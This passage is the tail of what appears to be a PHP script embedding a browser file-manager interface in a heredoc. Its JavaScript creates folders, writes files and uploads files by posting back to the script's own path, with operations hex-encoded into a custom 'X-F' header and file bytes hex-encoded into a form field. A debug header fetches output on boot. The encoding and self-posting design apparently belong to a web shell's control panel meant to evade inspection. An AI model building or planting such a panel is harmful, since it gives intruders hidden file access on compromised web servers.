  if (!r.ok) alert('some failed: ' + JSON.stringify(r.failed));
  fmRefresh();
}

async function fmMkdir() {
  const name = prompt('new folder name:');
  if (!name) return;
  const r = await fmJson('mkdir', { path: pathJoin(fmCwd, name) });
  if (!r.ok) alert('mkdir failed: ' + r.error);
  fmRefresh();
}

async function fmNewFile() {
  const name = prompt('new file name:');
  if (!name) return;
  const r = await fmJson('write', { path: pathJoin(fmCwd, name), content: '' });
  if (!r.ok) alert('create failed: ' + r.error);
  fmRefresh();
}

async function fmUpload() {
  const inp = document.createElement('input');
  inp.type = 'file';
  inp.onchange = async () => {
    const f = inp.files && inp.files[0];
    if (!f) return;
    $('#fmStatus').textContent = 'uploading ' + f.name + ' (' + fmtSize(f.size) + ')...';
    const buf = new Uint8Array(await f.arrayBuffer());
    let h = '';
    const chunk = 8192;
    for (let i = 0; i < buf.length; i += chunk) {
      h += Array.prototype.map.call(buf.subarray(i, i + chunk), b => b.toString(16).padStart(2,'0')).join('');
    }
    const meta = hex(JSON.stringify({ op: 'upload', path: pathJoin(fmCwd, f.name) }));
    try {
      const r = await timedFetch(location.pathname, {
        method: 'POST',
        headers: {
          'X-F': meta,
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'u=' + h
      });
      const j = await r.json();
      if (!j.ok) { alert('upload failed: ' + j.error); }
      else { $('#fmStatus').textContent = 'uploaded ' + j.bytes + ' bytes'; }
    } catch (e) {
      alert('upload error: ' + (e.name === 'AbortError' ? 'timeout' : e.message));
    }
    fmRefresh();
  };
  inp.click();
}

async function boot() {
  $('#out').textContent = 'loading...';
  try {
    const r = await timedFetch(location.pathname, { method: 'GET', headers: { 'X-Debug': '1' } });
    $('#out').textContent = await r.text();
  } catch (e) {
    $('#out').textContent = 'boot error: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}
boot();
fmInit();
</script>
</html>
HTMLEOF;
}
